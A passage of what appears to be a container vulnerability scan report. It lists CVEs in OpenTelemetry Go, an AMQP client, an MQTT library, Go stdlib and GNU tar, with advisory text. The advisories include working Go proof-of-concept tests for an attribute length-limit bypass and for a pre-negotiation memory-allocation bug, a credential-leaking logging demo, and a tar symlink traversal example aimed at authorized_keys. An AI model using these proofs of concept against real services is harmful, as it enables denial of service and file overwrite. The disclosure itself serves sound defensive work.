			limit, len(stored), maxBytes)
	}
}
```

Run:

```
go mod tidy
go test -count=1 -v -run "TestOT001_FFFDOnlyStringBypassesTraceLengthLimit|TestOT001_FFFDMixedStringOverRetains|TestOT001_ASCIIControl|TestOT001_FFFDOnlyStringBypassesLogLengthLimit" .
```

Expected output (captured against the published v1.46.0 modules; the three FAIL lines are the bypass being triggered and the PASS control proves the limit is active in the same setup; the only varying parts are the durations in parentheses and the total on the `FAIL	otelpoc` summary line):

```
=== RUN   TestOT001_FFFDOnlyStringBypassesLogLengthLimit
    otelgo_log_truncate_test.go:66: sdk/log input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_log_truncate_test.go:69: BYPASS: sdk/log WithAttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesLogLengthLimit (0.00s)
=== RUN   TestOT001_FFFDOnlyStringBypassesTraceLengthLimit
    otelgo_truncate_test.go:61: input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_truncate_test.go:67: BYPASS: AttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesTraceLengthLimit (0.00s)
=== RUN   TestOT001_FFFDMixedStringOverRetains
    otelgo_truncate_test.go:81: input: 106 chars / 306 bytes; stored: 105 chars / 305 bytes; limit=5
    otelgo_truncate_test.go:85: BYPASS: AttributeValueLengthLimit=5 but 105 chars / 305 bytes stored
--- FAIL: TestOT001_FFFDMixedStringOverRetains (0.00s)
=== RUN   TestOT001_ASCIIControl
    otelgo_truncate_test.go:98: input: 20 chars / 20 bytes; stored: 5 chars / 5 bytes; limit=5
--- PASS: TestOT001_ASCIIControl (0.00s)
FAIL
FAIL	otelpoc	0.059s
FAIL
```

The mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.

## Impact

Applications that enable `AttributeValueLengthLimit` (or `WithAttributeValueLengthLimit` for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.

## Suggested fix

In the optimistic loop, count every rune of size > 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current `truncate_test.go` has no U+FFFD case).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-81870?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.5.0%2C%3C%3D1.44.0"><img alt="low 2.0: CVE--2026--81870" src="https://img.shields.io/badge/CVE--2026--81870-lightgrey?label=low%202.0&labelColor=fce1a9"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=1.5.0<br/><=1.44.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.45.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.195%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

OpenTelemetry Go versions 1.5.0 through 1.44.0 can include trace exporter endpoint configuration in an internal diagnostic log emitted when an SDK `TracerProvider` is created. The default OpenTelemetry logger does not emit this event. Exposure requires an application to install a logger that enables OpenTelemetry's internal Info-level diagnostics and for someone other than the intended audience to have access to those logs.

The logged configuration can disclose the address of the trace collector and whether the OTLP/HTTP connection is configured as insecure. The Zipkin exporter logs its complete collector URL, so credentials in URL userinfo or tokens in the query string are also disclosed if an application embeds them there. OTLP authentication headers, TLS key material, and exported span data are not included in this log.

Exporter `MarshalLog` implementations that caused this configuration to be included in internal logs were introduced by [`a1fff3c`](https://github.com/open-telemetry/opentelemetry-go/commit/a1fff3c2588c783d1f3f6fd2315aa2660fc6d330).

### Details

When `sdk/trace.NewTracerProvider` constructs a provider, it records a `TracerProvider created` internal Info event containing the provider configuration. In affected versions, the configuration's `MarshalLog` methods recursively include:

1. the provider's span processors;
2. each processor's span exporter; and
3. for the OTLP trace exporter, its client configuration.

This causes the following values to be present in the event:

- OTLP trace gRPC: the configured endpoint;
- OTLP trace HTTP: the configured endpoint and the `Insecure` flag; and
- Zipkin: the complete collector URL.

OpenTelemetry Go does not emit this event with its default logger, which only emits errors. An application must explicitly configure a sufficiently verbose logger with `otel.SetLogger`. The required `logr` verbosity is version-dependent:

- versions 1.5.0 through 1.14.x use `V(1)` for this Info event; and
- versions 1.15.0 through 1.44.0 use `V(4)`.

OTLP header configuration is not part of the marshaled object, so credentials supplied with `WithHeaders` or the corresponding environment variables are not exposed. The documented OTLP `WithEndpoint` input is a collector address rather than a credential-bearing URL. The higher-risk case is therefore the Zipkin collector URL, which is retained and logged in full, or an application passing sensitive data in an OTLP endpoint outside the documented format.

### Proof of concept

The following program demonstrates the behavior with OpenTelemetry Go 1.44.0. It deliberately places credentials and a token in the Zipkin collector URL and enables internal Info logging:

```go
package main

import (
	"bytes"
	"context"
	"fmt"

	"github.com/go-logr/logr/funcr"
	"go.opentelemetry.io/otel"
	"go.opentelemetry.io/otel/exporters/zipkin"
	sdktrace "go.opentelemetry.io/otel/sdk/trace"
)

func main() {
	var logs bytes.Buffer
	otel.SetLogger(funcr.New(func(_, args string) {
		_, _ = logs.WriteString(args)
	}, funcr.Options{Verbosity: 4}))

	exporter, err := zipkin.New(
		"http://user:pass@<!-- -->zipkin.internal:9411/api/v2/spans?token=secret",
	)
	if err != nil {
		panic(err)
	}

	tp := sdktrace.NewTracerProvider(sdktrace.WithBatcher(exporter))
	_ = tp.Shutdown(context.Background())

	fmt.Println(logs.String())
}
```

The `TracerProvider created` event contains:

```text
http://user:pass@<!-- -->zipkin.internal:9411/api/v2/spans?token=secret
```

For versions before 1.15.0, set `funcr.Options{Verbosity: 1}` instead.

### Impact

This is a conditional disclosure through application logs. Affected applications must enable verbose OpenTelemetry internal diagnostics and configure a trace exporter containing information they do not intend to expose to readers of those logs. In that configuration, a person or system with log access can learn the trace collector address and internal network topology. If credentials or tokens are embedded directly in a Zipkin collector URL, those values can also be recovered from the logs.

There is no exposure with the default OpenTelemetry logger, and the vulnerable log is generated from local application configuration rather than remotely supplied span data. OTLP authentication headers, certificate or private-key contents, and telemetry payloads are not logged by this path.

### Remediation

Upgrade the affected OpenTelemetry Go modules to version 1.45.0 or later. The fix in [`3a1412d`](https://github.com/open-telemetry/opentelemetry-go/commit/3a1412d2b3bc4e4231fbeac2ed42117ae541bb38) stops recursively marshaling exporter and client configuration and records their types instead.

If an immediate upgrade is not possible:

- keep OpenTelemetry internal logging below the Info verbosity described above;
- do not embed credentials or tokens in exporter endpoint URLs; use authentication headers or another supported credential mechanism; and
- restrict access to existing logs and rotate any credentials that may already have been recorded.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.35+dfsg-3.1</code> (deb)</summary>

<small><code>pkg:deb/debian/tar@1.35%2Bdfsg-3.1?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-45582?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D1.35%2Bdfsg-3.1"><img alt="medium : CVE--2025--45582" src="https://img.shields.io/badge/CVE--2025--45582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.35+dfsg-3.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.499%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.35 allows file overwrite via directory traversal in crafted TAR archives, with a certain two-step process. First, the victim must extract an archive that contains a ../ symlink to a critical directory. Second, the victim must extract an archive that contains a critical file, specified via a relative pathname that begins with the symlink name and ends with that critical file's name. Here, the extraction follows the symlink and overwrites the critical file. This bypasses the protection mechanism of "Member name contains '..'" that would occur for a single TAR archive that attempted to specify the critical file via a ../ approach. For example, the first archive can contain "x -> ../../../../../home/victim/.ssh" and the second archive can contain x/authorized_keys. This can affect server applications that automatically extract any number of user-supplied TAR archives, and were relying on the blocking of traversal. This can also affect software installation processes in which "tar xf" is run more than once (e.g., when installing a package can automatically install two dependencies that are set up as untrusted tarballs instead of official packages).

---
Disputed tar issue, works as documented per upstream:
https://lists.gnu.org/archive/html/bug-tar/2025-08/msg00012.html
https://github.com/i900008/vulndb/blob/main/Gnu_tar_vuln.md

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-2541?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2005--2541" src="https://img.shields.io/badge/CVE--2005--2541-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.992%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.

---
This is intended behaviour, after all tar is an archiving tool and you
need to give -p as a command line flag
- tar <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=328228; unimportant)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/eclipse/paho.mqtt.golang</strong> <code>1.5.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/eclipse/paho.mqtt.golang@1.5.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-10543?s=github&n=paho.mqtt.golang&ns=github.com%2Feclipse&t=golang&vr=%3C1.5.1"><img alt="medium 6.3: CVE--2025--10543" src="https://img.shields.io/badge/CVE--2025--10543-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Numeric Truncation Error</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.5.1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.5.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.419%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Eclipse Paho Go MQTT v3.1 library (paho.mqtt.golang) versions <=1.5.0 UTF-8 encoded strings, passed into the library, may be incorrectly encoded if their length exceeds 65535 bytes. This may lead to unexpected content in packets sent to the server (for example, part of an MQTT topic may leak into the message body in a PUBLISH packet).

The issue arises because the length of the data passed in was converted from an int64/int32 (depending upon CPU) to an int16 without checks for overflows. The int16 length was then written, followed by the data (e.g. topic). This meant that when the data (e.g. topic) was over 65535 bytes then the amount of data written exceeds what the length field indicates. This could lead to a corrupt packet, or mean that the excess data leaks into another field (e.g. topic leaks into message body).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel</strong> <code>1.44.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel@1.44.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-128086?s=golang&n=otel&ns=go.opentelemetry.io&t=golang&vr=%3E%3D1.0.0-RC1%2C%3C1.47.0"><img alt="medium : CVE--2026--128086" src="https://img.shields.io/badge/CVE--2026--128086-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.0.0-RC1<br/><1.47.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.47.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.617%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Memory allocation amplification in W3C baggage parsing in go.opentelemetry.io/otel

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>stdlib</strong> <code>1.27.3</code> (golang)</summary>

<small><code>pkg:golang/stdlib@1.27.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-97054?s=golang&n=stdlib&t=golang&vr=%3E%3D1.27.0-0%2C%3C1.27.4"><img alt="medium : CVE--2026--97054" src="https://img.shields.io/badge/CVE--2026--97054-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.27.0-0<br/><1.27.4</code></td></tr>
<tr><td>Fixed version</td><td><code>1.27.4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.479%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

For HTTP/1 servers, when MaxBytesReader's limit is exceeded, "Connection: close" header is automatically set without synchronization, which might race with another header being set explicitly in the server handler. As a result, an HTTP/1 server that utilizes MaxBytesReader or MaxBytesHandler can crash due to runtime panic if its handler reads the request body concurrently with writing the response header.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/rabbitmq/amqp091-go</strong> <code>1.13.0</code> (golang)</summary>

<small><code>pkg:golang/github.com/rabbitmq/amqp091-go@1.13.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-107386?s=github&n=amqp091-go&ns=github.com%2Frabbitmq&t=golang&vr=%3C1.14.0"><img alt="medium 6.3: CVE--2026--107386" src="https://img.shields.io/badge/CVE--2026--107386-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.14.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.691%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary
The frame-size mitigation released in `amqp091-go` v1.13.0 can be bypassed before `connection.tune` completes. A malicious or compromised AMQP peer can send only a seven-byte body-frame header containing a large attacker-controlled `uint32` payload length. The client allocates a slice of that declared length before it verifies that the payload exists or rejects the frame for its invalid protocol state.

The bypass occurs because `Connection.maxFrameSize` starts at zero. The reader interprets zero as both “negotiated unlimited” and “not negotiated yet,” and skips the pre-allocation size check in either case. `Open` starts the reader goroutine before negotiation and does not store a limit until after it receives `connection.tune`.

This remains reachable even if the caller explicitly uses `Config{FrameSize: frameMinSize}`. A malicious broker can therefore cause excessive memory allocation, potentially terminating the Go client process through memory exhaustion, before authentication and connection setup complete.

## Relationship to the existing advisory

[GHSA-r9c8-gcjp-xfwh](https://github.com/rabbitmq/amqp091-go/security/advisories/GHSA-r9c8-gcjp-xfwh) describes attacker-controlled, unbounded allocation by a malicious broker and identifies v1.13.0 as the patched version. [Pull request 369](https://github.com/rabbitmq/amqp091-go/pull/369) added a frame-size check before parser allocation, but the check is active only when the stored maximum is nonzero.

The v1.13.0 source still:

1. starts the reader before protocol negotiation;
2. skips the bound while `maxFrameSize == 0`;
3. allocates the body using the peer-declared size; and
4. stores the negotiated maximum only after `connection.tune`.

This appears to be an incomplete-fix or state-boundary bypass of the existing advisory rather than an unrelated allocation issue.

## Affected source and root cause

The issue was reproduced at commit [`9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde`](https://github.com/rabbitmq/amqp091-go/commit/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde), dated 2026-07-30. The same relevant control flow is in the v1.13.0 tag.

The vulnerable sequence is:

1. [`Open` starts `c.reader(conn)` before calling `c.open(config)`](https://github.com/rabbitmq/amqp091-go/blob/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde/connection.go#L373-L392).
2. [The reader receives a pointer to the initially zero-valued `c.maxFrameSize`](https://github.com/rabbitmq/amqp091-go/blob/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde/connection.go#L971-L979).
3. [`ReadFrame` decodes the peer-controlled `uint32` size but rejects it only when `max > 0`](https://github.com/rabbitmq/amqp091-go/blob/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde/read.go#L46-L79).
4. [`parseBodyFrame` executes `make([]byte, size)` before `io.ReadFull`](https://github.com/rabbitmq/amqp091-go/blob/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde/read.go#L459-L466).
5. [`maxFrameSize` is first stored after processing `connection.tune`](https://github.com/rabbitmq/amqp091-go/blob/9313fd9ea47bdb4e8f7f5db9bef94d5534d0bdde/connection.go#L1297-L1305).

The source comments and regression tests explicitly combine “negotiated unlimited” with “not yet negotiated” as the same zero state. Those states need different security behavior.

## Safe reproduction

This reproducer does not start RabbitMQ, contact any hosted service, send a large payload, or attempt to crash the process. It declares a 2 MiB body and observes the size of the slice passed to the transport's payload `Read`. Receiving a 2 MiB destination slice proves that the allocation occurred; the test then releases the blocked read and exits.

1. Check out v1.13.0.
2. Save the following as `pre_negotiation_frame_limit_test.go` in the repository root.
3. Run `go test -run '^TestPreNegotiationFrameLimitBypass$' -count=1 -v .`.

```go
package amqp091

import (
	"encoding/binary"
	"io"
	"sync"
	"testing"
	"time"
)

const declaredBodySize = 2 << 20

type stagedFrameConn struct {
	mu          sync.Mutex
	header      []byte
	headerRead  bool
	bodyRead    chan int
	bodyOnce    sync.Once
	release     chan struct{}
	releaseOnce sync.Once
}

func newStagedFrameConn() *stagedFrameConn {
	header := make([]byte, 7)
	header[0] = frameBody
	binary.BigEndian.PutUint16(header[1:3], 1)
	binary.BigEndian.PutUint32(header[3:7], declaredBodySize)
	return &stagedFrameConn{
		header:   header,
		bodyRead: make(chan int, 1),
		release:  make(chan struct{}),
	}
}

func (c *stagedFrameConn) Read(p []byte) (int, error) {
	c.mu.Lock()
	if !c.headerRead {
		c.headerRead = true
		n := copy(p, c.header)
		c.mu.Unlock()
		return n, nil
	}
	c.mu.Unlock()

	c.bodyOnce.Do(func() { c.bodyRead <- len(p) })
	<-c.release
	return 0, io.EOF
}

func (c *stagedFrameConn) Write(p []byte) (int, error) { return len(p), nil }

func (c *stagedFrameConn) Close() error {
	c.releaseOnce.Do(func() { close(c.release) })
	return nil
}

func TestPreNegotiationFrameLimitBypass(t *testing.T) {
	conn := newStagedFrameConn()
	openDone := make(chan error, 1)

	go func() {
		_, err := Open(conn, Config{FrameSize: frameMinSize})
		openDone <- err
	}()

	select {
	case got := <-conn.bodyRead:
		if got != declaredBodySize {
			t.Fatalf("payload Read received a %d-byte slice; want %d", got, declaredBodySize)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("payload Read was not reached")
	}

	_ = conn.Close()
	select {
	case <-openDone:
	case <-time.After(5 * time.Second):
		t.Fatal("Open did not exit after the test connection closed")
	}
}
```

### Expected secure behavior

The pre-negotiation reader rejects the oversized declared frame before allocating its payload buffer. The transport should never receive a payload `Read` with a 2 MiB destination slice.

### Actual behavior

The test passes because the transport receives a payload `Read` whose destination slice is exactly 2 MiB, despite the caller setting `Config.FrameSize` to `frameMinSize`. This slice was created by `make([]byte, size)` using the untrusted frame header.

## Additional local validation

A five-test differential harness was run against the exact tested commit. All tests passed:

```text
=== RUN   TestCounterfactualZeroFrameLimitAllocatesBeforePayloadRead
--- PASS: TestCounterfactualZeroFrameLimitAllocatesBeforePayloadRead
=== RUN   TestCounterfactualNegotiatedLimitRejectsBeforePayloadAllocation
--- PASS: TestCounterfactualNegotiatedLimitRejectsBeforePayloadAllocation
=== RUN   TestCounterfactualZeroLimitAllowsSmallFrameControl
--- PASS: TestCounterfactualZeroLimitAllowsSmallFrameControl
=== RUN   TestCounterfactualNegotiatedLimitAllowsSmallFrameControl
--- PASS: TestCounterfactualNegotiatedLimitAllowsSmallFrameControl
=== RUN   TestCounterfactualPublicOpenReachesZeroLimitAllocation
--- PASS: TestCounterfactualPublicOpenReachesZeroLimitAllocation
PASS
ok github.com/rabbitmq/amqp091-go 0.907s
```

The controls establish that:

- the zero pre-negotiation state reaches attacker-sized allocation;
- a `frameMinSize` bound rejects the same declaration before allocation;
- both states continue to accept a valid small frame; and
- the vulnerable state is reachable through public `Open`, not only through an internal helper.

## Impact

The frame body length is a network-controlled 32-bit unsigned integer, so one seven-byte frame header can request an allocation approaching 4 GiB on a 64-bit client. The attacker does not need to transmit the declared body before allocation occurs. On memory-constrained clients or containers, this can cause severe memory pressure, an out-of-memory condition, or process termination.

The required attacker position is a malicious or compromised broker, or an equivalent peer able to provide the AMQP transport during connection establishment. No application credentials, user interaction, confidentiality impact, or integrity impact is required or claimed. The primary impact is availability of the client process and potentially dependent services.

## Protocol relevance

The [AMQP 0-9-1 reference](https://github.com/rabbitmq/amqp-0.9.1-spec/blob/main/docs/amqp-0-9-1-reference.md#L395-L398) requires peers to accept frames up to the 4096-byte `frame-min-size` before `frame-max` is negotiated. It does not require accepting arbitrarily large pre-negotiation frames. A provisional 4096-byte receive limit is therefore compatible with the stated pre-negotiation requirement.

## Suggested remediation

Represent these states separately:

- pre-negotiation, with a provisional `frameMinSize` receive bound;
- negotiated with a finite `frame_max`; and
- explicitly negotiated unlimited, if that behavior remains supported.

Initialize the provisional bound before the reader goroutine starts, then replace it with the negotiated result after `connection.tune`. Reject any declared payload that would make the total frame exceed the active limit before calling a frame parser or allocating a payload buffer. A protocol-state check that rejects body frames before connection setup completes would add defense in depth.

Please add a regression through public `Open` that sends an oversized body-frame header before `connection.tune` and verifies rejection before payload allocation, while retaining small valid-frame controls.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/trace</strong> <code>1.44.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel/trace@1.44.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-128085?s=github&n=trace&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.35.0%2C%3C1.47.0"><img alt="medium 5.3: CVE--2026--128085" src="https://img.shields.io/badge/CVE--2026--128085-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Incorrect Calculation of Multi-Byte String Length</i>

<table>
<tr><td>Affected range</td><td><code>>=1.35.0<br/><1.47.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.47.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The `AttributeValueLengthLimit` span/log-record limit can be bypassed entirely with attribute values that consist of valid U+FFFD (REPLACEMENT CHARACTER) runes. The counting-based truncation introduced by the fix for GHSA-p9f8-wvj8-2fg8 (commit `e016a78c9`, first released in v1.33.0) has an "optimistic" fast path that skips every U+FFFD without counting it and without falling back to the correct slow path. A value of 1000 U+FFFD runes (3000 bytes) is stored verbatim even with a limit of 5 characters (15 bytes). The same defect affects the attribute truncation paths in `go.opentelemetry.io/otel/sdk/trace` (`sdk/internal/attrnorm`), `go.opentelemetry.io/otel/sdk/log` (`sdk/log/internal/attrnorm`), and the auto-instrumentation tracer in `go.opentelemetry.io/otel/trace` (`trace/auto.go`, introduced in `v1.35.0`).

This is an incomplete-fix issue: it is a distinct defect in the replacement code that GHSA-p9f8-wvj8-2fg8 introduced, affecting exactly the versions that advisory says are fixed (>= v1.33.0). The original advisory covers only the pre-v1.33.0 code.

## Details

The shared truncation helper is generated from `internal/shared/attrnorm/truncate.go.tmpl`. In the v1.46.0 release, the generated copies are `sdk/internal/attrnorm/truncate.go` and `sdk/log/internal/attrnorm/truncate.go` (identical logic, different package names). The optimistic path (v1.46.0, `sdk/internal/attrnorm/truncate.go:175-199`) is:

```go
// Optimistically, assume all valid UTF-8.
var b strings.Builder
count := 0
for i, c := range s {
    if c != utf8.RuneError {
        count++
        if count > limit {
            return s[:i]
        }
        continue
    }
    _, size := utf8.DecodeRuneInString(s[i:])
    if size == 1 {
        // invalid encoding: fall through to the correct slow path
        ...
        break
    }
}
```

`range` over a string yields `utf8.RuneError` both for invalid bytes (size 1) and for a legitimately encoded U+FFFD (size 3). Only the size-1 case enters the slow path. A valid U+FFFD rune is therefore neither counted nor truncating: the loop slides over it. Consequences:

1. A value made only of valid U+FFFD runes never increments `count`, so no truncation ever triggers and the value is returned unchanged, whatever its length.
2. In a mixed string, every U+FFFD contributes 3 bytes that are not counted, and the final `return s[:i]` keeps all previously skipped U+FFFD runes, so the retained size grows linearly with the number of U+FFFD runes and is not bounded by `limit`.

The OpenTelemetry specification states that truncation applies "counting any character in it as 1". A valid U+FFFD is one character and must count as 1; here it counts as 0. The regression test suite of the repository contains no U+FFFD case, which is why this went unnoticed.

Call chains (v1.46.0):

- trace: `span.SetAttributes` -> `sdk/trace/span.go` (`normAttr`) -> `attrnorm.Truncate` -> `sdk/internal/attrnorm/truncate.go` (`truncate`)
- log: `Record.AddAttributes` / `SetAttributes` -> `sdk/log/record.go` (`attrnorm.TruncateValue`) -> `sdk/log/internal/attrnorm/truncate.go` (`truncate`)

Deduplication: GHSA-p9f8-wvj8-2fg8 describes the pre-v1.33.0 helper (`safeTruncateValidUTF8`), which gave up truncating entirely for strings containing RuneError. The rewrite in `e016a78c9` replaced that code; this report concerns the rewritten code, is present only in versions that the advisory lists as fixed, and no public issue or advisory describes it.

## PoC

Minimal reproduction with the published release (no repository checkout needed). Go 1.25+ is required (the release declares `go 1.25.0`; any recent toolchain auto-selects one).

Create a directory with these files.

`go.mod` (then run `go mod tidy` once to fill `go.sum`):

```
module otelpoc

go 1.25.0

require (
	go.opentelemetry.io/otel v1.46.0
	go.opentelemetry.io/otel/log v0.22.0
	go.opentelemetry.io/otel/sdk v1.46.0
	go.opentelemetry.io/otel/sdk/log v0.22.0
	go.opentelemetry.io/otel/trace v1.46.0
)
```

`otelgo_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	sdktrace "go.opentelemetry.io/otel/sdk/trace"
	"go.opentelemetry.io/otel/sdk/trace/tracetest"
	"go.opentelemetry.io/otel/trace"
)

// limitsWithLen returns span limits with AttributeValueLengthLimit=limit and
// everything else unlimited, isolating the length-limit enforcement under test.
func limitsWithLen(limit int) sdktrace.SpanLimits {
	lim := sdktrace.NewSpanLimits()
	lim.AttributeValueLengthLimit = limit
	lim.AttributeCountLimit = -1
	lim.AttributePerEventCountLimit = -1
	lim.AttributePerLinkCountLimit = -1
	lim.EventCountLimit = -1
	lim.LinkCountLimit = -1
	return lim
}

func captureOneSpan(t *testing.T, limit int, attrs ...attribute.KeyValue) []attribute.KeyValue {
	t.Helper()
	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
